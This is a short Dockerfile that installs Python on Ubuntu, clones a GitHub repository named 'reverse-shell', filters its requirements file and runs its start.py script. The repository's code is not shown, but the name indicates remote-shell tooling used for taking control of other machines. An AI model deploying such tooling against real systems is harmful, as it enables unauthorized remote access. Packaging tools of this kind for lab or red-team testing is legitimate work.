FROM ubuntu:latest

RUN apt-get update && \
    apt-get install -y python3 python3-pip git

RUN git clone https://github.com/zapeee/reverse-shell.git /app
WORKDIR /app

RUN sed -i '/os/d' requirements.txt && \
    pip3 install -r requirements.txt

CMD [ "python3", "start.py" ]
